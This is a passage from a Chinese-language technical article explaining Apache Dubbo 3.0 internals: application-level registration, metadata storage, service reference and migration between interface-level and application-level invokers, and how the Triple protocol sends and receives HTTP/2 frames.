中的会保证一个协议只对应一个端口，另外那个将被忽略，最终服务消费者在进行服务引入时将会用到这个 endpoint 信息。 确定好实例信息后之后，就进行最终的应用注册了，就把实例信息存入注册中心的 /services/应用名，目录下： 可以看出 services 节点下存的是应用名，应用名的节点下存的是实例 ip 和实例 port，而 ip 和 port 这个节点中的内容就是实例的一些基本信息。 额外，我们可以配置 dubbo.metadata.storage-type，默认时 local，可以通过配置改为 remote： dubbo:\tapplication: name: dubbo-springboot-demo-provider metadata-type: remote 这个配置其实跟应用元数据服务有关系： 如果为 local，那就会启用应用元数据服务，最终服务消费者就会调用元数据服务获取到应用元数据信息； 如果为 remote，那就不会暴露应用元数据服务，那么服务消费者从元数据中心获取应用元数据； 在 Dubbo2.7 中就有了元数据中心，它其实就是用来减轻注册中心的压力的，Dubbo 会把服务信息完整的存一份到元数据中心，元数据中心也可以用 Zookeeper来实现，在暴露完元数据服务之后，在注册实例信息到注册中心之前，就会把 MetadataInfo 存入元数据中心，比如： 节点内容为： app:dubbo-springboot-demo-provider, revision:64e68950e300068e6b5f8632d9fd141d, services: org.apache.dubbo.springboot.demo.HelloService:tri: name:org.apache.dubbo.springboot.demo.HelloService, protocol:tri, path:org.apache.dubbo.springboot.demo.HelloService, params: side:provider, release:, methods:sayHello, deprecated:false, dubbo:2.0.2, interface:org.apache.dubbo.springboot.demo.HelloService, service-name-mapping:true, generic:false, metadata-type:remote, application:dubbo-springboot-demo-provider, background:false, dynamic:true, anyhost:true , org.apache.dubbo.springboot.demo.DemoService:tri: name:org.apache.dubbo.springboot.demo.DemoService, protocol:tri, path:org.apache.dubbo.springboot.demo.DemoService, params: side:provider, release:, methods:sayHelloStream,sayHello,sayHelloServerStream, deprecated:false, dubbo:2.0.2, interface:org.apache.dubbo.springboot.demo.DemoService, service-name-mapping:true, generic:false, metadata-type:remote, application:dubbo-springboot-demo-provider, background:false, dynamic:true, anyhost:true 这里面就记录了当前实例上提供了哪些服务以及对应的协议，注意并没有保存对应的端口……，所以后面服务消费者得利用实例信息中的 endpoint，因为endpoint 中记录了协议对应的端口…. 其实元数据中心和元数据服务提供的功能是一样的，都可以用来获取某个实例的 MetadataInfo，上面中的 UUID 表示实例编号，只不过元数据中心是集中式的，元数据服务式分散在各个提供者实例中的，如果整个微服务集群压力不大，那么效果差不多，如果微服务集群压力大，那么元数据中心的压力就大，此时单个元数据服务就更适合，所以默认也是采用的元数据服务。 至此，应用级服务注册的原理就分析完了，总结一下： 在导出某个 Dubbo 服务 URL 时，会把服务 URL 存入 MetadataInfo 中； 导出完某个 Dubbo 服务后，就会把服务接口名:应用名存入元数据中心（可以用 Zookeeper 实现）； 导出所有服务后，完成服务引入后； 判断要不要启动元数据服务，如果要就进行导出，固定使用 Dubbo 协议； 将 MetadataInfo 存入元数据中心； 确定当前实例信息（应用名、ip、port、endpoint）； 将实例信息存入注册中心，完成应用注册； 服务暴露服务暴露就是根据不同的协议启动不同的 Server，比如：dubbo 和 tri 协议启动的都是 Netty，像 Dubbo2.7 中的 http 协议启动的就是 Tomcat，这块在服务调用的时候再来分析。 服务引入@DubboReferenceprivate DemoService demoService; 需要利用 @DubboReference 注解来引入某一个 Dubbo 服务，应用在启动过程中，进行完服务导出之后，就会进行服务引入，属性的类型就是一个 Dubbo 服务接口，而服务引入最终要做到的就是给这个属性赋值一个接口代理对象。 在 Dubbo2.7 中，只有接口级服务注册，服务消费者会利用接口名从注册中心找到该服务接口所有的服务 URL，服务消费者会根据每个服务 URL 的 protocol、ip、port 生成对应的 Invoker 对象，比如生成 TripleInvoker、DubboInvoker 等，调用这些 Invoker 的 invoke() 方法就会发送数据到对应的 ip、port，生成好所有的 Invoker 对象之后，就会把这些 Invoker 对象进行封装并生成一个服务接口的代理对象，代理对象调用某个方法时，会把所调用的方法信息生成一个 Invocation 对象，并最终通过某一个 Invoker 的 invoke() 方法把 Invocation 对象发送出去，所以代理对象中的 Invoker 对象是关键，服务引入最核心的就是要生成这些 Invoker 对象。 Invoker 是非常核心的一个概念，也有非常多种类，比如： TripleInvoker：表示利用 tri 协议把 Invocation 对象发送出去； DubboInvoker：表示利用 dubbo 协议把 Invocation 对象发送出去； ClusterInvoker：有负载均衡功能； MigrationInvoker：迁移功能，Dubbo3.0 新增的 像 TripleInvoker 和 DubboInvoker 对应的就是具体服务提供者，包含了服务提供者的 ip 地址和端口，并且会负责跟对应的 ip 和 port 建立 Socket 连接，后续就可以基于这个 Socket 连接并按协议格式发送 Invocation 对象。 比如现在引入了 DemoService 这个服务，那如果该服务支持： 一个 tri 协议，绑定的端口为 20881； 一个 tri 协议，绑定的端口为 20882； 一个 dubbo 协议，绑定的端口为 20883； 那么在服务消费端这边，就会生成两个 TripleInvoker 和一个 DubboInvoker，代理对象执行方法时就会进行负载均衡选择其中一个 Invoker 进行调用。 接口级服务引入在服务导出时，Dubbo3.0 默认情况下即会进行接口级注册，也会进行应用级注册，目的就是为了兼容服务消费者应用，用的还是 Dubbo2.7，用 Dubbo2.7 就只能老老实实的进行接口级服务引入。 接口级服务引入核心就是要找到当前所引入的服务有哪些服务 URL，然后根据每个服务 URL 生成对应的 Invoker，流程为： 首先，根据当前引入的服务接口生成一个 RegistryDirectory 对象，表示动态服务目录，用来查询并缓存服务提供者信息； RegistryDirectory 对象会根据服务接口名去注册中心，比如：Zookeeper 中的 /dubbo/服务接口名/providers/ 节点下查找所有的服务 URL； 根据每个服务 URL 生成对应的 Invoker 对象，并把 Invoker 对象存在 RegistryDirectory 对象的 invokers 属性中； RegistryDirectory 对象也会监听 /dubbo/服务接口名/providers/ 节点的数据变化，一旦发生了变化就要进行相应的改变； 最后将 RegistryDirectory 对象生成一个 ClusterInvoker 对象，到时候调用 ClusterInvoker 对象的 invoke() 方法就会进行负载均衡选出某一个 Invoker 进行调用； 应用级服务引入在 Dubbo 中，应用级服务引入，并不是指引入某个应用，这里和 SpringCloud 是有区别的，在 SpringCloud 中，服务消费者只要从注册中心找到要调用的应用的所有实例地址就可以了，但是在 Dubbo 中找到应用的实例地址还远远不够，因为在 Dubbo 中是直接使用的接口，所以在 Dubbo 中就算是应用级服务引入，最终还是得找到服务接口有哪些服务提供者。 所以，对于服务消费者而言，不管是使用接口级服务引入，还是应用级服务引入，最终的结果应该得是一样的，也就是某个服务接口的提供者 Invoker 是一样的，不可能使用应用级服务引入得到的 Invoker 多一个或少一个，但是！！！，目前会有情况不一致，就是一个协议有多个端口时，比如在服务提供者应用这边支持： dubbo: application: name: dubbo-springboot-demo-provider protocols: p1: name: dubbo port: 20881 p2: name: tri port: 20882 p3: name: tri port: 50051 那么在消费端进行服务引入时，比如：引入 DemoService 时，接口级服务引入会生成 3 个 Invoker（2个 TripleInvoker，1个DubboInvoker），而应用级服务引入只会生成 2 个 Invoker（1个TripleInvoker，1个DubboInvoker），原因就是在进行应用级注册时是按照一个协议对应一个port存的。 那既然接口级服务引入和应用级服务引入最终的结果差不多，可能就不理解了，那应用级服务引入有什么好处呢？要知道应用级服务引入和应用级服务注册是对应，服务提供者应用如果只做应用级注册，那么对应的服务消费者就只能进行应用级服务引入，好处就是前面所说的，减轻了注册中心的压力等，那么带来的影响就是服务消费者端寻找服务 URL 的逻辑更复杂了。 只要找到了当前引入服务对应的服务 URL，然后生成对应的 Invoker，并最终生成一个 ClusterInvoker。 在进行应用级服务引入时： 首先，根据当前引入的服务接口生成一个 ServiceDiscoveryRegistryDirectory 对象，表示动态服务目录，用来查询并缓存服务提供者信息； 根据接口名去获取 dubbomapping服务接口名节点的内容，拿到的就是该接口所对应的应用名； 有了应用名之后，再去获取 services应用名节点下的实例信息； 依次遍历每个实例，每个实例都有一个编号 revision 根据 metadata-type 进行判断如果是 local：则调用实例上的元数据服务获取应用元数据（MetadataInfo）；如果是 remote：则根据应用名从元数据中心获取应用元数据（MetadataInfo）； 获取到应用元数据之后就进行缓存，key 为 revision，MetadataInfo 对象为 value 这里为什么要去每个实例上获取应用的元数据信息呢？因为有可能不一样，虽然是同一个应用，但是在运行不同的实例的时候，可以指定不同的参数，比如不同的协议，不同的端口，虽然在生产上基本不会这么做，但是 Dubbo 还是支持了这种情况 根据从所有实例上获取到的 MetadataInfo 以及 endpoint 信息，就能知道所有实例上所有的服务 URL（注意：一个接口+一个协议+一个实例 : 对应一个服务URL） 拿到了这些服务 URL 之后，就根据当前引入服务的信息进行过滤，会根据引入服务的接口名+协议名，消费者可以在 @DubboReference 中指定协议，表示只使用这个协议调用当前服务，如果没有指定协议，那么就会去获取 tri、dubbo、rest 这三个协议对应的服务 URL（Dubbo3.0 默认只支持这三个协议） 这样，经过过滤之后，就得到了当前所引入的服务对应的服务 URL 了 根据每个服务 URL 生成对应的 Invoker 对象，并把 Invoker 对象存在 ServiceDiscoveryRegistryDirectory 对象的 invokers 属性中 最后将 ServiceDiscoveryRegistryDirectory 对象生成一个 ClusterInvoker 对象，到时候调用 ClusterInvoker 对象的 invoke() 方法就会进行负载均衡选出某一个 Invoker 进行调用 MigrationInvoker 的生成上面分析了接口级服务引入和应用级服务引入，最终都是得到某个服务对应的服务提供者 Invoker，那最终进行服务调用时，到底该怎么选择呢？ 所以在 Dubbo3.0 中，可以配置： # dubbo.application.service-discovery.migration 仅支持通过 -D 以及 全局配置中心 两种方式进行配置。dubbo.application.service-discovery.migration=APPLICATION_FIRST # 可选值 # FORCE_INTERFACE，强制使用接口级服务引入 # FORCE_APPLICATION，强制使用应用级服务引入 # APPLICATION_FIRST，智能选择是接口级还是应用级，默认就是这个 对于前两种强制的方式，没什么特殊，就是上面走上面分析的两个过程，没有额外的逻辑，那对于 APPLICATION_FIRST 就需要有额外的逻辑了，也就是 Dubbo 要判断，当前所引入的这个服务，应该走接口级还是应用级，这该如何判断呢？ 事实上，在进行某个服务的服务引入时，会统一利用 InterfaceCompatibleRegistryProtocol 的 refer 来生成一个 MigrationInvoker 对象，在 MigrationInvoker 中有三个属性： // 用来记录接口级ClusterInvokerprivate volatile ClusterInvokerT invoker;// 用来记录应用级的ClusterInvokerprivate volatile ClusterInvokerT serviceDiscoveryInvoker; // 用来记录当前使用的ClusterInvoker，要么是接口级，要么应用级private volatile ClusterInvokerT currentAvailableInvoker; 一开始构造出来的 MigrationInvoker 对象中三个属性都为空，接下来会利用 MigrationRuleListener 来处理 MigrationInvoker 对象，也就是给这三个属性赋值。 在 MigrationRuleListener 的构造方法中，会从配置中心读取 DUBBO_SERVICEDISCOVERY_MIGRATION 组下面的”当前应用名+.migration”的配置项，配置项为 yml 格式，对应的对象为 MigrationRule，也就是可以配置具体的迁移规则，比如：某个接口或某个应用的 MigrationStep（FORCE_INTERFACE、APPLICATION_FIRST、FORCE_APPLICATION），还可以配置 threshold，表示一个阈值，比如：配置为 2，表示应用级 Invoker 数量是接口级 Invoker 数量的两倍时才使用应用级 Invoker，不然就使用接口级数量，可以参考：cn.dubbo.apache.orgzhdocsadv… 如果没有配置迁移规则，则会看当前应用中是否配置了 migration.step，如果没有，那就从全局配置中心读取 dubbo.application.service-discovery.migration 来获取 MigrationStep，如果也没有配置，那 MigrationStep 默认为 APPLICATION_FIRST 如果没有配置迁移规则，则会看当前应用中是否配置了 migration.threshold，如果没有配，则 threshold 默认为 -1。 在应用中可以这么配置： dubbo:\tapplication: name: dubbo-springboot-demo-consumer parameters: migration.step: FORCE_APPLICATION migration.threshold: 2 确定了 step 和 threshold 之后，就要真正开始给 MigrationInvoker 对象中的三个属性赋值了，先根据 step 调用不同的方法 switch (step) case APPLICATION_FIRST: // 先进行接口级服务引入得到对应的ClusterInvoker，并赋值给invoker属性 // 再进行应用级服务引入得到对应的ClusterInvoker，并赋值给serviceDiscoveryInvoker属性 // 再根据两者的数量判断到底用哪个，并且把确定的ClusterInvoker赋值给currentAvailableInvoker属性 migrationInvoker.migrateToApplicationFirstInvoker(newRule); break; case FORCE_APPLICATION: // 只进行应用级服务引入得到对应的ClusterInvoker， // 并赋值给serviceDiscoveryInvoker和currentAvailableInvoker属性 success = migrationInvoker.migrateToForceApplicationInvoker(newRule); break; case FORCE_INTERFACE: default: // 只进行接口级服务引入得到对应的ClusterInvoker， // 并赋值给invoker和currentAvailableInvoker属性 success = migrationInvoker.migrateToForceInterfaceInvoker(newRule); 这里只需要分析当 step 为 APPLICATION_FIRST 时，是如何确定最终要使用的 ClusterInvoker 的。 得到了接口级 ClusterInvoker 和应用级 ClusterInvoker 之后，就会利用 DefaultMigrationAddressComparator 来进行判断： 如果应用级 ClusterInvoker 中没有具体的 Invoker，那就表示只能用接口级 Invoker 如果接口级 ClusterInvoker 中没有具体的 Invoker，那就表示只能用应用级 Invoker 如果应用级 ClusterInvoker 和接口级 ClusterInvoker 中都有具体的 Invoker，则获取对应的 Invoker 个数 如果在迁移规则和应用参数中都没有配置 threshold，那就读取全局配置中心的 dubbo.application.migration.threshold 参数，如果也没有配置，则threshold 默认为 0（不是-1了） 用应用级 Invoker 数量 接口级 Invoker 数量，得到的结果如果大于等于 threshold，那就用应用级 ClusterInvoker，否则用接口级 ClusterInvoker threshold 默认为 0，那就表示在既有应用级 Invoker 又有接口级 Invoker 的情况下，就一定会用应用级 Invoker，两个正数相除，结果肯定为正数，当然你自己可以控制 threshold，如果既有既有应用级 Invoker 又有接口级 Invoker 的情况下，你想在应用级 Invoker 的个数大于接口级 Invoker 的个数时采用应用级Invoker，那就可以把 threshold 设置为 1，表示个数相等，或者个数相除之后的结果大于 1 时用应用级 Invoker，否者用接口级 Invoker 这样 MigrationInvoker 对象中的三个数据就能确定好值了，和在最终的接口代理对象执行某个方法时，就会调用 MigrationInvoker 对象的 invoke，在这个invoke 方法中会直接执行 currentAvailableInvoker 对应的 invoker 的 invoker 方法，从而进入到了接口级 ClusterInvoker 或应用级 ClusterInvoker 中，从而进行负载均衡，选择出具体的 DubboInvoer 或 TripleInvoker，完成真正的服务调用。 服务调用底层原理在 Dubbo2.7 中，默认的是 Dubbo 协议，因为 Dubbo 协议相比较于 Http1.1 而言，Dubbo 协议性能上是要更好的。 但是 Dubbo 协议自己的缺点就是不通用，假如现在通过 Dubbo 协议提供了一个服务，那如果想要调用该服务就必须要求服务消费者也要支持 Dubbo 协议，比如想通过浏览器直接调用 Dubbo 服务是不行的，想通过 Nginx 调 Dubbo 服务也是不行得。 而随着企业的发展，往往可能会出现公司内部使用多种技术栈，可能这个部门使用 Dubbo，另外一个部门使用 Spring Cloud，另外一个部门使用 gRPC，那此时部门之间要想相互调用服务就比较复杂了，所以需要一个通用的、性能也好的协议，这就是 Triple 协议。 Triple 协议是基于 Http2 协议的，也就是在使用 Triple 协议发送数据时，会按 HTTP2 协议的格式来发送数据，而 HTTP2 协议相比较于 HTTP1 协议而言，HTTP2是 HTTP1 的升级版，完全兼容 HTTP1，而且 HTTP2 协议从设计层面就解决了 HTTP1 性能低的问题。 另外，Google 公司开发的 gRPC，也基于的 HTTP2，目前 gRPC 是云原生事实上协议标准，包括 k8setcd 等都支持 gRPC 协议。 所以 Dubbo3.0 为了能够更方便的和 k8s 进行通信，在实现 Triple 的时候也兼容了 gRPC，也就是可以用 gPRC 的客户端调用 Dubbo3.0 所提供的 triple 服务，也可以用 triple 服务调用 gRPC 的服务。 Triple 的底层原理分析就是因为 HTTP2 中的数据帧机制，Triple 协议才能支持 UNARY、SERVER_STREAM、BI_STREAM 三种模式。 UNARY：就是最普通的，服务端只有在接收到完请求包括的所有的 HEADERS 帧和 DATA 帧之后(通过调用 onCompleted() 发送最后一个 DATA 帧)，才会处理数据，客户端也只有接收完响应包括的所有的 HEADERS 帧和 DATA 帧之后，才会处理响应结果。 SERVER_STREAM：服务端流，特殊的地方在于，服务端在接收完请求包括的所有的 DATA 帧之后，才会处理数据，不过在处理数据的过程中，可以多次发送响应 DATA 帧（第一个 DATA 帧发送之前会发送一个 HEADERS 帧），客户端每接收到一个响应 DATA 帧就可以直接处理该响应 DATA 帧，这个模式下，客户端只能发一次数据，但能多次处理响应 DATA 帧。 BI_STREAM：双端流，或者客户端流，特殊的地方在于，客户端可以控制发送多个请求 DATA 帧（第一个 DATA 帧发送之前会发送一个 HEADERS 帧），服务端会不断的接收到请求 DATA 帧并进行处理，并且及时的把处理结果作为响应 DATA 帧发送给客户端（第一个 DATA 帧发送之前会发送一个 HEADERS 帧），而客户端每接收到一个响应结果 DATA 帧也会直接处理，这种模式下，客户端和服务端都在不断的接收和发送 DATA 帧并进行处理，注意请求 HEADER 帧和响应 HEADERS 帧都只发了一个。 Triple 请求调用和响应处理创建一个 Stream 的前提是先得有一个 Socket 连接，所以我们得先知道 Socket 连接是在哪创建的。 在服务提供者进行服务导出时，会按照协议以及对应的端口启动 Server，比如：Triple 协议就会启动 Netty 并绑定指定的端口，等待 Socket 连接，在进行服务消费者进行服务引入的过程中，会生成 TripleInvoker 对象，在构造 TripleInvoker 对象的构造方法中，会利用 ConnectionManager 创建一个 Connection 对象，而Connection 对象中包含了一个 Bootstrap 对象（Netty 中用来建立 Socket 连接的），不过以上都只是创建对象，并不会真正和服务去建立 Socket 连接，所以在生成 TripleInvoker 对象过程中不会真正去创建 Socket 连接，那什么时候创建的呢？ 当我们在服务消费端执行以下代码时：demoService.sayHello(habit) demoService 是一个代理对象，在执行方法的过程中，最终会调用 TripleInvoker 的 doInvoke() 方法，在 doInvoke() 方法中，会利用 Connection 对象来判断Socket 连接是否可用，如果不可用并且没有初始化，那就会创建 Socket 连接。 一个 Connection 对象就表示一个 Socket 连接，在 TripleInvoker 对象中也只有一个 Connection 对象，也就是一个 TripleInvoker 对象只对应一个 Socket 连接，这个和 DubboInvoker 不太一样，一个 DubboInvoker 中可以有多个 ExchangeClient，每个 ExchangeClient 都会与服务端创建一个 Socket 连接，所以一个DubboInvoker 可以对应多个 Socket 连接，当然多个 Socket 连接的目的就是提高并发，不过在 TripleInvoker 对象中就不需要这么来设计了，因为可以 Stream机制来提高并发。 以上，我们知道了，当我们利用服务接口的代理对象执行方法时就会创建一个 Socket 连接，就算这个代理对象再次执行方法时也不会再次创建 Socket 连接了，值得注意的是，有可能两个服务接口对应的是一个 Socket 连接，举个例子。 比如服务提供者应用 A，提供了 DemoService 和 HelloService 两个服务，服务消费者应用 B 引入了这两个服务，那么在服务消费者这端，这个两个接口对应的代理对象对应的 TripleInvoker 是不同的两个，但是这两个 TripleInvoker 会公用一个 Socket 连接，因为 ConnectionManager 在创建 Connection 对象时会根据服务 URL 的 address 进行缓存，后续这两个代理对象在执行方法时使用的就是同一个 Socket 连接，但是是不同的 Stream。 Socket 连接创建好之后，就需要发送 Invocation 对象给服务提供者了，因为是基于的 HTTP2，所以要先创建一个 Stream，然后再通过 Stream 来发送数据。 TripleInvoker 中用的是 Netty，所以最终会利用 Netty 来创建 Stream，对应的对象为 Http2StreamChannel，消费端的 TripleInvoker 最终会利用Http2StreamChannel 来发送和接收数据帧，数据帧对应的对象为 Http2Frame，它又分为 Http2DataFrame、Http2HeadersFrame 等具体类型。 正常情况下，会每生成一个数据帧就会通过 Http2StreamChannel 发送出去，但是在 Triple 中有一个小小的优化，会有一个批量发送的思想，当要发送一个数据帧时，会先把数据帧放入一个 WriteQueue 中，然后会从线程池中拿到一个线程调用 WriteQueue 的 flush 方法，该方法的实现为： private void flush() try QueuedCommand cmd; int i = 0; boolean flushedOnce = false; // 只要队列中有元素就取出来，没有则退出while while ((cmd = queue.poll()) != null) // 把数据帧添加到Http2StreamChannel中， // 添加并不会立马发送，调用了flush才发送 cmd.run(channel); i++; // DEQUE_CHUNK_SIZE=128 // 连续从队列中取到了128个数据帧就flush一次 if (i == DEQUE_CHUNK_SIZE) i = 0; channel.flush(); flushedOnce = true; // i != 0 表示从队列中取到了数据但是没满128个 // 如果i=0，flushedOnce=false也flush一次 if (i != 0 || !flushedOnce) channel.flush(); finally scheduled.set(false); // 如果队列中又有数据了，则继续会递归调用flush if (!queue.isEmpty()) scheduleFlush(); 总体思想是，只要向 WriteQueue 中添加一个数据帧之后，那就会尝试开启一个线程，要不要开启线程要看 CAS，比如现在有 10 个线程同时向 WriteQueue 中添加了一个数据帧，那么这 10 个线程中的某一个会 CAS 成功，其他会 CAS 失败，那么此时 CAS 成功的线程会负责从线程池中获取另外一个线程执行上面的 flush 方法，从而获取 WriteQueue 中的数据帧然后发送出去。 有了底层这套设计之后，对于 TripleInvoker 而 ，它只需要把要发送的数据封装为数据帧，然后添加到 WriteQueue 中就可以了。 在 TripleInvoker 的 doInvoke() 源码中，在创建完成 Socket 连接后，就会： 基于 Socket 连接先构造一个 ClientCall 对象 根据当前调用的方法信息构造一个 RequestMetadata 对象，这个对象表示，当前调用的是哪个接口的哪个方法，并且记录了所配置的序列化方式，压缩方式，超时时间等 紧接着构造一个 ClientCall.Listener，这个 Listener 是用来处理响应结果的，针对不同的流式调用类型，会构造出不同的 ClientCall.Listener：UNARY：会构造出一个 UnaryClientCallListener，内部包含了一个 DeadlineFuture，DeadlineFuture 是用来控制 timeout 的SERVER_STREAM：会构造出一个 ObserverToClientCallListenerAdapter，内部包含了调用方法时传入进来的 StreamObserver 对象，最终就是由这个StreamObserver 对象来处理响应结果的BI_STREAM：和 SERVER_STREAM 一样，也会构造出来一个 ObserverToClientCallListenerAdapter 紧着着，就会调用 ClientCall 对象的 start 方法创建一个 Stream，并且返回一个 StreamObserver 对象 得到了 StreamObserver 对象后，会根据不同的流式调用类型来使用这个 StreamObserver 对象UNARY：直接调用 StreamObserver 对象的 onNext() 方法来发送方法参数，然后调用 onCompleted 方法，然后返回一个 new AsyncRpcResult(future, invocation)，future 就是 DeadlineFuture，后续会通过 DeadlineFuture 同步等待响应结果的到来，并最终把获取到的响应结果返回给业务方法。SERVER_STREAM：直接调用 StreamObserver 对象的 onNext() 方法来发送方法参数，然后调用 onCompleted 方法，然后返回一个 new AsyncRpcResult(CompletableFuture.completedFuture(new AppResponse()), invocation)，后续不会同步了，并且返回 null 给业务方法。BI_STREAM：直接返回 new AsyncRpcResult( CompletableFuture.completedFuture(new AppResponse(requestObserver)), invocation)，也不同同步等待响应结果了，而是直接把 requestObserver 对象返回给了业务方法。所以我们可以发现，不管是哪种流式调用类型，都会先创建一个 Stream，得到对应的一个 StreamObserver 对象，然后调用 StreamObserver 对象的onNext 方法来发送数据，比如发送服务接口方法的入参值，比如一个 User 对象：在发送 User 对象之前，会先发送请求头，请求头中包含了当前调用的是哪个接口、哪个方法、版本号、序列化方式、压缩方式等信息，注意请求头中会包含一些 gRPC 相关的 key，主要就是为了兼容 gRPC然后就是发送请求体然后再对 User 对象进行序列化，得到字节数组然后再压缩字节数组然后把压缩之后的字节数组以及是否压缩标记生成一个 DataQueueCommand 对象，并且把这个对象添加到 writeQueue 中去，然后执行scheduleFlush()，该方法就会开启一个线程从 writeQueue 中获取数据进行发送，发送时就会触发 DataQueueCommand 对象的 doSend 方法进行发送，该方法中会构造一个 DefaultHttp2DataFrame 对象，该对象中由两个属性 endStream，表示是不是 Stream 中的最后一帧，另外一个属性为content，表示帧携带的核心数据，该数据格式为：第一个字节记录请求体是否被压缩紧着的四个字节记录字节数组的长度后面就真正的字节数据以上是 TripleInvoker 发送数据的流程，接下来就是 TripleInvoker 接收响应数据的流程，ClientCall.Listener 就是用来监听是否接收到的响应数据的，不同的流式调用方式会对应不同的 ClientCall.Listener：UNARY：UnaryClientCallListener，内部包含了一个 DeadlineFuture，DeadlineFuture 是用来控制 timeout 的SERVER_STREAM：ObserverToClientCallListenerAdapter，内部包含了调用方法时传入进来的 StreamObserver 对象，最终就是由这个StreamObserver 对象来处理响应结果的BI_STREAM：和 SERVER_STREAM 一样，也会构造出来一个 ObserverToClientCallListenerAdapter那现在要了解的就是，如何知道某个 Stream 中有响应数据，然后触发调用 ClientCall.Listener 对象的相应的方法。要监听某个 Stream 中是否有响应数据，这个肯定是 Netty 来做的，实际上，在之前创建 Stream 时，会向 Http2StreamChannel 绑定一个TripleHttp2ClientResponseHandler，很明显这个 Handler 就是用来处理接收到的响应数据的。在 TripleHttp2ClientResponseHandler 的 channelRead0 方法中，每接收一个响应数据就会判断是 Http2HeadersFrame 还是 Http2DataFrame，然后调用 ClientTransportListener 中对应的 onHeader 方法和 onData 方法：onHeader 方法通过处理响应头，会生成一个 TriDecoder，它是用来解压并处理响应体的onData 方法会利用 TriDecoder 的 deframe() 方法来处理响应体另外如果服务提供者那边调用了 onCompleted 方法，会向客户端响应一个请求头，endStream 为 true，表示响应结束，也会触发执行 onHeader 方法，从而会调用 TriDecoder 的 close() 方法.TriDecoder 的 deframe() 方法在处理响应体数据时，会分为两个步骤：先解析前 5 个字节，先解析第 1 个字节确定该响应体是否压缩了，再解析后续 4 个字节确定响应体内容的字节长度然后再取出该长度的字节作为响应体数据，如果压缩了，那就进行解压，然后把解压之后的字节数组传递给 ClientStreamListenerImpl 的onMessage() 方法，该方法就会按对应的序列化方式进行反序列化，得到最终的对象，然后再调用到最终的 UnaryClientCallListener 或者ObserverToClientCallListenerAdapter 的 onMessage() 方法。TriDecoder 的 close() 方法最终也会调用到 UnaryClientCallListener 或者 ObserverToClientCallListenerAdapter 的 close() 方法。UnaryClientCallListener，构造它时传递了一个 DeadlineFuture 对象：onMessage() 接收到响应结果对象后，会把结果对象赋值给 appResponse 属性onClose() 会取出 appResponse 属性记录的结果对象构造出来一个 AppResponse 对象，然后调用 DeadlineFuture 的 received 方法，从而将方法调用线程接阻塞，并得到响应结果对象。ObserverToClientCallListenerAdapter，构造它时传递了一个 StreamObserver 对象：onMessage() 接收到响应结果对象后，会调用 StreamObserver 对象的 onNext()，并把结果对象传给 onNext() 方法，从触发了程序员的 onNext() 方法逻辑。onClose() 就会调用 StreamObserver 对象的 onCompleted()，或者调用 onError() 方法 Triple 请求处理和响应结果发送其实这部分内容和发送请求和处理响应是非常类似的，无非就是把视角从消费端切换到服务端，前面分析的是消费端发送和接收数据，现在要分析的是服务端接收和发送数据。 消费端在创建一个 Stream 后，会生成一个对应的 StreamObserver 对象用来发送数据和一个 ClientCall.Listener 用来接收响应数据，对于服务端其实也一样，在接收到消费端创建 Stream 的命令后，也需要生成一个对应的 StreamObserver 对象用来响应数据以及一个 ServerCall.Listener 用来接收请求数据。 在服务导出时，TripleProtocol 的 export 方法中会开启一个 ServerBootstrap，并绑定指定的端口，并且最重要的是，Netty 会负责接收创建 Stream 的信息，一旦就收到这个信号，就会生成一个 ChannelPipeline，并给 ChannelPipeline 绑定一个 TripleHttp2FrameServerHandler，而这个TripleHttp2FrameServerHandler 就可以用来处理 Http2HeadersFrame 和 Http2DataFrame。 比如在接收到请求头后，会构造一个 ServerStream 对象，该对象有一个 ServerTransportObserver 对象，ServerTransportObserver 对象就会真正来处理请求头和请求体： onHeader() 方法，用来处理请求头比如从请求头中得到当前请求调用的是哪个服务接口，哪个方法构造一个 TriDecoder 对象，TriDecoder 对象用来处理请求体构造一个 ReflectionServerCall 对象并调用它的 doStartCall() 方法，从而生成不同的 ServerCall.ListenerUNARY：UnaryServerCallListenerSERVER_STREAM：ServerStreamServerCallListenerBI_STREAM：BiStreamServerCallListener并且在构造这些 ServerCall.Listener 时会把 ReflectionServerCall 对象传入进去，ReflectionServerCall 对象可以用来向客户端发送数据 onData() 方法，用来处理请求体，调用 TriDecoder 对象的 deframe 方法来处理请求体，如果是 endStream，那还会调用 TriDecoder 对象的 close 方法 TriDecoder：deframe()：这个方法的作用和客户端时一样的，都是先解析请求体的前 5 个字节，然后解压请全体，然后反序列化得到请求参数对象，然后调用不同的ServerCall.Listener 中的 onMessage() close()：当客户端调用 onCompleted 方法时，就表示发送数据完毕，此时会发送一个 DefaultHttp2DataFrame 并且 endStream 为 true，从而会触发服务端TriDecoder 对象的 close() 方法，从而调用不同的 ServerCall.Listener 中的 onComplete() UnaryServerCallListener： 在接收到请求头时，会构造 UnaryServerCallListener 对象，没什么特殊的 然后接收到请求体时，请求体中的数据就是调用接口方法的入参值，比如 User 对象，那么就会调用 UnaryServerCallListener 的 onMessage() 方法，在这个方法中会把 User 对象设置到 invocation 对象中 当消费端调用 onCompleted() 方法，表示请求体数据发送完毕，从而触发 UnaryServerCallListener 的 onComplete() 方法，在该方法中会调用 invoke() 方法，从而执行服务方法，并得到结果，得到结果后，会调用 UnaryServerCallListener 的 onReturn() 方法，把结果通过 responseObserver 发送给消费端，并调用 responseObserver 的 onCompleted() 方法，表示响应数据发送完毕，responseObserver 是 ReflectionServerCall 对象的一个 StreamObserver 适配对象（ServerCallToObserverAdapter）。 再来看 ServerStreamServerCallListener： 在接收到请求头时，会构造 ServerStreamServerCallListener 对象，没什么特殊的 然后接收到请求体时，请求体中的数据就是调用接口方法的入参值，比如 User 对象，那么就会调用 ServerStreamServerCallListener 的 onMessage() 方法，在这个方法中会把 User 对象以及 responseObserver 对象设置到 invocation 对象中，这是和 UnaryServerCallListener 不同的地方，UnaryServerCallListener 只会把 User 对象设置给 invocation，而 ServerStreamServerCallListener 还会把 responseObserver 对象设置进去，因为服务 端流需要这个 responseObserver 对象，服务方法拿到这个对象后就可以自己来控制如何发送响应体，并什么时候调用 onCompleted() 方法来表示响应体发送完毕。 当消费端调用 onCompleted() 方法，表示请求体数据发送完毕，从而触发 ServerStreamServerCallListener 的 onComplete() 方法，在该方法中会调用invoke() 方法，从而执行服务方法，从而会通过 responseObserver 对象来发送数据 方法执行完后，仍然会调用 ServerStreamServerCallListener的onReturn() 方法，但是个空方法 再来看最后一个 BiStreamServerCallListener： 在接收到请求头时，会构造 BiStreamServerCallListener 对象，这里比较特殊，会把 responseObserver 设置给 invocation 并执行 invoke() 方法，从而执行服务方法，并执行 onReturn() 方法，onReturn() 方法中会把服务方法的执行结果，也是一个 StreamObserver 对象，赋值给 BiStreamServerCallListener 对象的requestObserver 属性。 